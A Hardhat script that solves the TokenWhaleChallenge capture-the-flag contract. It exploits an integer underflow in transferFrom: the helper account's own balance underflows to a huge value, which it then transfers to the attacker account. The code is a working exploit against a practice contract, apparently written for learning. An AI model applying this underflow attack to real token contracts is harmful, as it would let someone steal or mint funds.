const { ethers } = require("hardhat");

async function main() {
  const [deployer, attacker, addr1, addr2] = await hre.ethers.getSigners();
  const MainContract = await ethers.getContractFactory("TokenWhaleChallenge", deployer);

  const mainContract = await MainContract.deploy(attacker.address);

  await mainContract.connect(attacker).transfer(addr1.address, 10);
  await mainContract.connect(addr1).approve(addr2.address, ethers.constants.MaxUint256);

  await mainContract.connect(addr2).transferFrom(addr1.address, attacker.address, 10);
  const addr2Balance = await mainContract.balanceOf(addr2.address);
  // beware of the overflow here. That's why we subtract here
  await mainContract.connect(addr2).transfer(attacker.address, addr2Balance.sub(1000));

  console.log("Is completed:", await mainContract.isComplete());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
